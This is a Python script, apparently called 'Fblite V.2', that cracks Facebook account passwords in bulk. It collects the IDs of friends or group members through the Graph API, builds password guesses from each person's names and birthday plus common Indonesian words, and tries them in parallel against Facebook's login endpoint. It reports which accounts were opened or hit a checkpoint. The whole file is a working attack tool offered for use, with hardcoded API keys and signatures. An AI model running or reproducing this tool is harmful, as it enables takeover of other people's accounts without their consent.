# -*- coding: utf-8 -*-
#Type: Fblite V.2
#Remake By K4d1T

import mechanize, requests, json, hashlib, os, sys, time, urllib, string as stg
from random import choice as ch
from multiprocessing.pool import ThreadPool
from prompt_toolkit import prompt as pr
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh((mechanize._http.HTTPRefreshProcessor()), max_time=1)

def res():
    python2 = sys.executable
    (os.execl)(python2, python2, *sys.argv)
    curdir = os.getcwd()


if os.name == 'nt':
    wrn = ''
else:
    wrn = ('\x1b[0;1m', '\x1b[1;31m', '\x1b[1;32m', '\x1b[1;33m', '\x1b[1;34m', '\x1b[1;35m',
           '\x1b[1;36m' , '\033[2;31m' , '\033[2;36m' , '\033[2;33m')

def heder():
    try:
        hed = open('agent.txt', 'r').read()
        if len(hed) < 5 or hed == '':
            os.remove('agent.txt')
            exit(ch(wrn) + 'Oops user agent kosong')
        else:
            return hed
    except FileNotFoundError:
        print(ch(wrn) + 'User Agent tidak ada\nSilahkan Copas dari Browser!')
        if os.name == 'nt':
            os.system('start https://pgl.yoyo.org/http/browser-headers.php')
        else:
            os.system('xdg-open https://pgl.yoyo.org/http/browser-headers.php')
        sw = input(ch(wrn) + 'Tempel User Agent Disini: ')
        open('agent.txt', 'w').write(sw)
        res()


idf = []
idg = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"
need = ('first_name', 'last_name', 'username' , 'birthday')
a = 0
lod = '\|/'



def cls():
    print('\033[36m\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n')
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')


def wel():
    for i in '<<<<<<<<<<... ':
        for n in range(20):
            print((ch(wrn) + ch(stg.ascii_letters + stg.digits + '.') + '\x08'), end='', flush=True)
            time.sleep(0.01)

        print(i, end='', flush=True)

    cls()
    os.system(f"echo -e -n '{ch(wrn)}';cowsay -f vader fblite Toolkit v.2 By K4d1T")


def check(i, x, kyun):
    if 'access_token' in kyun:
        print(wrn[2] + '[OK] ' + '=> ' + i + ' : ' + x )
    elif 'www.facebook.com' in kyun['error_msg']:
        print(wrn[3] + '[CP] ' + '=> ' + i + ' : ' + x )


def token():
    asw = os.listdir()
    if 'login.txt' in asw:
        tod = open('login.txt', 'r').read()
        log = requests.get('https://graph.facebook.com/me?access_token=' + tod)
        bz = json.loads(log.text)
        if 'error' in bz:
            print(f"{ch(wrn)}Error: Sesi ini telah dibatalkan karena pengguna mengubah kata sandi mereka atau Facebook telah mengubah sesi untuk alasan keamanan\nSilahkan login kembali dengan akun yang sama atau akun yang berbeda")
            exit(os.system('rm login.txt'))
        else:
            return (
             bz['name'], tod)
    else:
        tod = input('[!]Ups Sory Token failed !!\n\033[37m[?]\033[37mLogin Your Acount facebook?(y|n)')
        if tod == 'y':
            login()
        else:
            exit()


def login():
	
    usr = pr('[?]Id/email: ')
    pw = pr('[?]Password: ', is_password=True)
    cls()
    br.open('https://m.facebook.com')
    br._factory.is_html = True
    br.select_form(nr=0)
    br.form['email'] = usr
    br.form['pass'] = pw
    br.submit()
    url = br.geturl()
    if 'save-device' in url:
        print('[!]\033[36mSedang Login!')
        time.sleep(3)
        print('[+]Ngeteh Asuu...')
        time.sleep(3)
        sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + usr + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pw + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
        data = {'api_key':'882a8490361da98702bf97a021ddc14d',  'credentials_type':'password',  'email':usr,  'format':'JSON',  'generate_machine_id':'1',  'generate_session_cookies':'1',  'locale':'en_US',  'method':'auth.login',  'password':pw,  'return_ssl_resources':'0',  'v':'1.0'}
        x = hashlib.new('md5')
        x.update(sig.encode())
        a = x.hexdigest()
        data.update({'sig': a})
        url = 'https://api.facebook.com/restserver.php'
        r = requests.get(url, params=data)
        z = json.loads(r.text)
        open('login.txt', 'w').write(z['access_token'])
        print('[+]Bauu Memek...')
        res()
    elif 'checkpoint' in url:
        print('[!]\033[33;1mAcount Has been checkpoint')
    else:
        print('[!]username/password salah')
        login()


def contact():
    try:
        su = int(input(ch(wrn) + '[?]1.wa> ' + ch(wrn)))
        if su == 1:
            os.system('xdg-open https://wa.me/6281511897416')
        elif su == 2:
            os.system('')
        else:
            nanya()
    except:
        pass


def nanya():
    print(f"{ch(wrn)}\033[1;37mWellcom {name}")
    
    print(' ')
   
    try:
        asw = input(f"{ch(wrn)}\033[1;37m[ \033[32m1 ].\033[1;37mFrom List friend \n[ \033[32m2 ].\033[1;37mFrom List Group\n[ \033[32m3 ].\033[1;37mLogOut\n[ \033[32m4 ].\033[1;37mDelete user\n[ \033[32m5 ].\033[1;37mContact Author\n[ \033[32m0 ].\033[1;37mExit\n\n[chouse]_>{ch(wrn)} ")
    except:
        nanya()

    if asw == '1':
        tmn()
    elif asw == '2':
        grp()
    elif asw == '3':
        exit(os.remove('login.txt'))
    elif asw == '4':
        exit(os.remove('agent.txt'))
    elif asw == '5':
        contact()
    elif asw == '6':
    	yahoo()
    else:
        exit()


def tmn():
    kya = input(ch(wrn) + '\n[*]\x1b[0;1mMine/other:' + ch(wrn))
    if kya == 'mine':
        hz = 'me'
    elif kya == 'other':
        hz = input(f"{ch(wrn)}\x1b[0;1m[*]People ID: {ch(wrn)}")
    else:
        nanya()
    r = requests.get('https://graph.facebook.com/' + hz + '/friends?limit=999999999&access_token=' + tok)
    z = json.loads(r.text)
    for s in z['data']:
        idf.append(s['id'])
        print((ch(wrn) + 'Mengambil id: ' + s['id']), end='\r')
    
    print('\033[32m[*]\033[32m Mengambil id: Done!           ')
    time.sleep(4)
    print(ch(wrn) + '\033[32m[*]\033[32m Total:', len(idf))
    print('\033[32m[*]\033[32m Waiting..')
    print("\033[1;97m════════════════════════════════════════")
    hh = ThreadPool(30)
    hh.map(crack, idf)


def grp():
    a = 1
    humu = ('/groups/?access_token=', '/members?fields=id&limit=999999999&access_token=')
    why = input(f"{ch(wrn)}[*]mine/other/Id: ")
    if why == 'mine':
        kzl = 'me'
        ls = humu[0]
    elif why == 'other':
        kzl = input(f"{ch(wrn)}\x1b[0;1m[*]Your id: ")
        ls = humu[0]
    elif why == 'id':
        kzl = input(f"{ch(wrn)}\x1b[0;1m[*]Group id: ")
        ls = humu[1]
    else:
        nanya()
    if ls == humu[0]:
        al = input(f"{ch(wrn)}\x1b[0;1m[*]all/one: ")
    else:
        al = 'grup'
    r = requests.get('https://graph.facebook.com/' + kzl + ls + tok)
    z = json.loads(r.text)
    if al == 'one':
        print(f"{ch(wrn)}Kalo Gak Ada Pilihan Enter Aja")
        for i in z['data']:
            print(wrn[0] + str(a) + '. ' + i['name'])
            a += 1

        try:
            ye = int(input(ch(wrn) + '\n\x1b[0;1m[+]Pilih_>: ')) - 1
            
        except:
            nanya()

        r = requests.get('https://graph.facebook.com/' + z['data'][ye]['id'] + humu[1] + tok)
        z = json.loads(r.text)
        for i in z['data']:
            idg.append(i['id'])
            print((ch(wrn) + 'Mengambil id: ' + i['id']), end='\r')

    elif al == 'all':
        for i in z['data']:
            print('\rNama: ' + i['name'])
            r = requests.get('https://graph.facebook.com/' + i['id'] + humu[1] + tok)
            k = json.loads(r.text)
            for n in k['data']:
                idg.append(n['id'])
                print((ch(wrn) + 'Mengambil id: ' + n['id']), end='\r')

    elif al == 'grup':
        for i in z['data']:
            idg.append(i['id'])
            print((ch(wrn) + 'Mengambil id: ' + i['id']), end='\n')
    
    print('\033[32m[+]\033[32m Mengambil id: Done!           ')
    time.sleep(3)
    print(ch(wrn) + '\033[32m[+]\033[32m Total:', len(idg))
    print('\033[32m[+]\033[32m Waiting..')
    print("\033[1;97m════════════════════════════════════════")
    hh = ThreadPool(30)
    hh.map(crack, idg)


def crack(usr):
    global a
    moe = [
     'sayang' , 'bangsat' , 'anjing' , 'samlekom' , 'indonesia' , 'kontol' , 'makasar']
    uh = requests.get('https://graph.facebook.com/' + usr + '/?access_token=' + tok)
    nya = json.loads(uh.text)
    for i in nya:
        if i in need:
            if i == 'birthday':
                vu = nya[i].replace('/', '')
                moe.append(vu)
                moe.append(vu[2:4] + vu[:2] + vu[4:])
                moe.append(vu[4:] + vu[:2] + vu[2:4])
                moe.append(vu[4:] + vu[2:4] + vu[:2])
            else:
                moe.append(nya[i])
                moe.append(nya[i] + '123')
                moe.append(nya[i] + '12345')
                
                
               
                
                

    for x in moe:
        try:
        	
            print((wrn[0] + '|' + lod[a] + '|' + 'cracking star!'), end='\r')
            
            a = a + 1 if a < len(lod) - 1 else 0
            db = urllib.request.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + usr + '&locale=en_US&password=' + x + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            kya = json.load(db)
            check(usr, x, kya)
        except:
            pass


cls()
wel()
br.addheaders = [('user-Agent', heder())]
try:
    try:
        while True:
            name, tok = token()
            nanya()
            input(ch(wrn) + '[Done]')
            cls()
            wel()

    except:
        pass

finally:
    print(f"{ch(wrn)}\033[0m[!]Token Failed")
    print(f"{ch(wrn)}[+]Silahkan Ketik Kembali ")
    print(f"{ch(wrn)}[+]Comand : python fblite.py")
    
